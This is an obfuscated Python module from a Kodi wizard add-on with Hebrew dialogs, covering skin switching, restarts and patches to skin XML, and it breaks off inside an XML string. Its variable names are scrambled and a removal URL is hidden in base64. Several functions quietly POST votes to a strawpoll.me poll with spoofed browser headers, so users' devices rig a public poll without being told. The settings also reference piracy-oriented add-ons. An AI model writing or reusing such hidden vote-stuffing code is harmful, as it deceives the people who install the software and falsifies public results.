# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:39
ADDONTITLE =uservar .ADDONTITLE #line:40
ADDON =wiz .addonId (ADDON_ID )#line:41
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:42
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:43
DIALOG =xbmcgui .Dialog ()#line:44
DP =xbmcgui .DialogProgress ()#line:45
HOME =xbmc .translatePath ('special://home/')#line:46
LOG =xbmc .translatePath ('special://logpath/')#line:47
PROFILE =xbmc .translatePath ('special://profile/')#line:48
ADDONS =os .path .join (HOME ,'addons')#line:49
USERDATA =os .path .join (HOME ,'userdata')#line:50
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:51
PACKAGES =os .path .join (ADDONS ,'packages')#line:52
ADDOND =os .path .join (USERDATA ,'addon_data')#line:53
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:54
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:55
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:56
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:57
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:58
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:59
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:60
DATABASE =os .path .join (USERDATA ,'Database')#line:61
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:62
ICON =os .path .join (ADDONPATH ,'icon.png')#line:63
ART =os .path .join (ADDONPATH ,'resources','art')#line:64
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:65
DP2 =xbmcgui .DialogProgressBG ()#line:66
SKIN =xbmc .getSkinDir ()#line:67
BUILDNAME =wiz .getS ('buildname')#line:68
DEFAULTSKIN =wiz .getS ('defaultskin')#line:69
DEFAULTNAME =wiz .getS ('defaultskinname')#line:70
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:71
BUILDVERSION =wiz .getS ('buildversion')#line:72
BUILDTHEME =wiz .getS ('buildtheme')#line:73
BUILDLATEST =wiz .getS ('latestversion')#line:74
INSTALLMETHOD =wiz .getS ('installmethod')#line:75
SHOW15 =wiz .getS ('show15')#line:76
SHOW16 =wiz .getS ('show16')#line:77
SHOW17 =wiz .getS ('show17')#line:78
SHOW18 =wiz .getS ('show18')#line:79
SHOWADULT =wiz .getS ('adult')#line:80
SHOWMAINT =wiz .getS ('showmaint')#line:81
AUTOCLEANUP =wiz .getS ('autoclean')#line:82
AUTOCACHE =wiz .getS ('clearcache')#line:83
AUTOPACKAGES =wiz .getS ('clearpackages')#line:84
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:85
AUTOFEQ =wiz .getS ('autocleanfeq')#line:86
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:87
INCLUDENAN =wiz .getS ('includenan')#line:88
INCLUDEURL =wiz .getS ('includeurl')#line:89
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:90
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:91
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:92
INCLUDEVIDEO =wiz .getS ('includevideo')#line:93
INCLUDEALL =wiz .getS ('includeall')#line:94
INCLUDEBOB =wiz .getS ('includebob')#line:95
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:96
INCLUDESPECTO =wiz .getS ('includespecto')#line:97
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:98
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:99
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:100
INCLUDESALTS =wiz .getS ('includesalts')#line:101
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:102
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:103
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:104
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:105
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:106
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:107
INCLUDEURANUS =wiz .getS ('includeuranus')#line:108
SEPERATE =wiz .getS ('seperate')#line:109
NOTIFY =wiz .getS ('notify')#line:110
NOTEDISMISS =wiz .getS ('notedismiss')#line:111
NOTEID =wiz .getS ('noteid')#line:112
NOTIFY2 =wiz .getS ('notify2')#line:113
NOTEID2 =wiz .getS ('noteid2')#line:114
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:115
NOTIFY3 =wiz .getS ('notify3')#line:116
NOTEID3 =wiz .getS ('noteid3')#line:117
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:118
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:119
TRAKTSAVE =wiz .getS ('traktlastsave')#line:120
REALSAVE =wiz .getS ('debridlastsave')#line:121
LOGINSAVE =wiz .getS ('loginlastsave')#line:122
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:123
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:124
KEEPINFO =wiz .getS ('keepinfo')#line:125
KEEPSOUND =wiz .getS ('keepsound')#line:127
KEEPVIEW =wiz .getS ('keepview')#line:128
KEEPSKIN =wiz .getS ('keepskin')#line:129
KEEPADDONS =wiz .getS ('keepaddons')#line:130
KEEPSKIN2 =wiz .getS ('keepskin2')#line:131
KEEPSKIN3 =wiz .getS ('keepskin3')#line:132
KEEPTORNET =wiz .getS ('keeptornet')#line:133
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:134
KEEPPVR =wiz .getS ('keeppvr')#line:135
ENABLE =uservar .ENABLE #line:136
KEEPVICTORY =wiz .getS ('keepvictory')#line:137
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 =''#line:252
IPTVSIMPL18PC =''#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	OOO00OO0OO0OOOOO0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	OOO000O00000000O0 =[];OO0O0OOOOOO0OOOO0 =[]#line:266
	for O000000OOO0O00OO0 in sorted (OOO00OO0OO0OOOOO0 ,key =lambda O0OOO0O0O000OO00O :O0OOO0O0O000OO00O ):#line:267
		O00OO0OO0O0O0O0OO =os .path .split (O000000OOO0O00OO0 [:-1 ])[1 ]#line:268
		O00000O000000O0OO =os .path .join (O000000OOO0O00OO0 ,'addon.xml')#line:269
		if os .path .exists (O00000O000000O0OO ):#line:270
			O0O0000OO0OOO0OO0 =open (O00000O000000O0OO )#line:271
			OOOOO0OOO0OO00000 =O0O0000OO0OOO0OO0 .read ()#line:272
			O0O00OO0000O0OO00 =parseDOM2 (OOOOO0OOO0OO00000 ,'addon',ret ='id')#line:273
			O0OOO0000OOOO000O =O00OO0OO0O0O0O0OO if len (O0O00OO0000O0OO00 )==0 else O0O00OO0000O0OO00 [0 ]#line:274
			try :#line:275
				O00OOOOO00OO000O0 =xbmcaddon .Addon (id =O0OOO0000OOOO000O )#line:276
				OOO000O00000000O0 .append (O00OOOOO00OO000O0 .getAddonInfo ('name'))#line:277
				OO0O0OOOOOO0OOOO0 .append (O0OOO0000OOOO000O )#line:278
			except :#line:279
				pass #line:280
	O000OO0OOOO0O0OOO =[];O0O0OOOO0O0OOO000 =0 #line:281
	O0000O0OO0O000OO0 =["Current Skin -- %s"%currSkin ()]+OOO000O00000000O0 #line:282
	O0O0OOOO0O0OOO000 =DIALOG .select ("Select the Skin you want to swap with.",O0000O0OO0O000OO0 )#line:283
	if O0O0OOOO0O0OOO000 ==-1 :return #line:284
	else :#line:285
		OO0OO0OOO0O00O0OO =(O0O0OOOO0O0OOO000 -1 )#line:286
		O000OO0OOOO0O0OOO .append (OO0OO0OOO0O00O0OO )#line:287
		O0000O0OO0O000OO0 [O0O0OOOO0O0OOO000 ]="%s"%(OOO000O00000000O0 [OO0OO0OOO0O00O0OO ])#line:288
	if O000OO0OOOO0O0OOO ==None :return #line:289
	for OO0OO0O0OO0O0000O in O000OO0OOOO0O0OOO :#line:290
		swapSkins (OO0O0OOOOOO0OOOO0 [OO0OO0O0OO0O0000O ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (OO0O00O0O00O00OOO ,title ="Error"):#line:295
	OO0OO00O0OO00OO0O ='lookandfeel.skin'#line:296
	OOO00OO0O0O0O00OO =OO0O00O0O00O00OOO #line:297
	OO0OOOO000OOOO00O =getOld (OO0OO00O0OO00OO0O )#line:298
	OOO0O0O0OO0OOOO00 =OO0OO00O0OO00OO0O #line:299
	setNew (OOO0O0O0OO0OOOO00 ,OOO00OO0O0O0O00OO )#line:300
	O0OOO0O00OOO0O0OO =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO0O00OOO0O0OO <100 :#line:302
		O0OOO0O00OOO0O0OO +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (O00OO00O0O00OOO0O ):#line:309
	try :#line:310
		O00OO00O0O00OOO0O ='"%s"'%O00OO00O0O00OOO0O #line:311
		OO0000O0000O0OO0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O00OO00O0O00OOO0O )#line:312
		O0OO00OO000OOOOO0 =xbmc .executeJSONRPC (OO0000O0000O0OO0O )#line:314
		O0OO00OO000OOOOO0 =simplejson .loads (O0OO00OO000OOOOO0 )#line:315
		if O0OO00OO000OOOOO0 .has_key ('result'):#line:316
			if O0OO00OO000OOOOO0 ['result'].has_key ('value'):#line:317
				return O0OO00OO000OOOOO0 ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (OO00O0OOO0OO0OO0O ,O00O0OOOO00000O00 ):#line:324
	try :#line:325
		OO00O0OOO0OO0OO0O ='"%s"'%OO00O0OOO0OO0OO0O #line:326
		O00O0OOOO00000O00 ='"%s"'%O00O0OOOO00000O00 #line:327
		OOO00O0O000O00O00 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO00O0OOO0OO0OO0O ,O00O0OOOO00000O00 )#line:328
		OOO0OO0O0O0OO0O00 =xbmc .executeJSONRPC (OOO00O0O000O00O00 )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			OO00O00000O0O0OOO =xbmcgui .DialogProgress ()#line:339
			OO00O00000O0O0OOO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			OO00O00000O0O0OOO .update (0 )#line:343
			for OO0O00O0O0O00O00O in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				OO00O00000O0O0OOO .update (int ((5 -OO0O00O0O0O00O00O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0O00O0O0O00O00O ),'')#line:346
				if OO00O00000O0O0OOO .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			OO00O00000O0O0OOO =xbmcgui .DialogProgress ()#line:352
			OO00O00000O0O0OOO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			OO00O00000O0O0OOO .update (0 )#line:356
			for OO0O00O0O0O00O00O in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				OO00O00000O0O0OOO .update (int ((5 -OO0O00O0O0O00O00O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0O00O0O0O00O00O ),'')#line:359
				if OO00O00000O0O0OOO .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    O000OO0OOOO00000O ='18773068'#line:372
    O00OO0O000O00O000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O000OO0OOOO00000O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    OOOO0OO0O0000OOO0 ='145273320'#line:386
    OOOOOOO0O00OOO0OO ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        O00000OO0000OO00O =OOOO0OO0O0000OOO0 #line:389
    else :#line:390
        O00000OO0000OO00O =OOOOOOO0O00OOO0OO #line:391
    O0000O0O0OO00OO00 ={'options':O00000OO0000OO00O }#line:395
    OOOOO000OO000OO0O =requests .post ('https://www.strawpoll.me/'+O000OO0OOOO00000O ,headers =O00OO0O000O00O000 ,data =O0000O0O0OO00OO00 )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        O00O0O00000O0O0OO ='18773068'#line:401
        O0000O00OOOOOO0OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00O0O00000O0O0OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        OO0O00OO0O0000000 ='145273320'#line:415
        OOO0OOOO00OOO0000 ={'options':OO0O00OO0O0000000 }#line:421
        O000OOOOO0OOO0000 =requests .post ('https://www.strawpoll.me/'+O00O0O00000O0O0OO ,headers =O0000O00OOOOOO0OO ,data =OOO0OOOO00OOO0000 )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        O00OO00000OOO0OOO ='18773068'#line:428
        O000OO0O0OO00O0OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OO00000OOO0OOO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        OOOOO0O0O0000OOO0 ='145273321'#line:442
        OO0O00O000OO00O00 ={'options':OOOOO0O0O0000OOO0 }#line:448
        O0O00O0OOOO00OO0O =requests .post ('https://www.strawpoll.me/'+O00OO00000OOO0OOO ,headers =O000OO0O0OO00O0OO ,data =OO0O00O000OO00O00 )#line:450
   except :pass #line:451
def kodi17to18 ():#line:454
  if KODIV >=18 :#line:456
    O0000OOO0O00O000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:458
    with open (O0000OOO0O00O000O ,'r')as OOOO0OOO0OOO00O00 :#line:459
      O0OO000O0OO0000O0 =OOOO0OOO0OOO00O00 .read ()#line:460
    O0OO000O0OO0000O0 =O0OO000O0OO0000O0 .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.12.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''','''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.14.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''')#line:507
    with open (O0000OOO0O00O000O ,'w')as OOOO0OOO0OOO00O00 :#line:510
      OOOO0OOO0OOO00O00 .write (O0OO000O0OO0000O0 )#line:511
    O0000OOO0O00O000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:517
    with open (O0000OOO0O00O000O ,'r')as OOOO0OOO0OOO00O00 :#line:518
      O0OO000O0OO0000O0 =OOOO0OOO0OOO00O00 .read ()#line:519
    O0OO000O0OO0000O0 =O0OO000O0OO0000O0 .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">9</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <control type="grouplist" id="9">
                        <ondown>9</ondown>
                        <onup>9</onup>
                        <onleft>8000</onleft>
                        <onright>2</onright>
                        <width>100%</width>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
                    <control type="grouplist" id="2">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>9</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 
                
            </control>

            <!-- Default Templates -->
            <control type="button" id="3">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="4">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="5">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="6">
                <width>100%</width>
                <height>69</height>
                <texture colordiffuse="PosterBorder">common/white.png</texture>
                <include>Defs_OptionButton</include>
                <visible>false</visible>
            </control>
            <control type="label" id="7">
                <width>100%</width>
                <height>69</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>blue</textcolor>
            </control>
            <control type="sliderex" id="8">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
			<control type="button" id="13">
				<description>default Section Button</description>
				<width>400</width>
				<height>62</height>
				<align>center</align>
        <texturenofocus colordiffuse="PosterBorder">common/white.png</texturenofocus>
        <texturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</texturefocus>
        <alttexturenofocus colordiffuse="PosterBorder">common/white.png</alttexturenofocus>
        <alttexturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</alttexturefocus>
			</control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onup>2</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="10">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="11">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="12">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>

    </controls>

</window>
''','''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">3</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
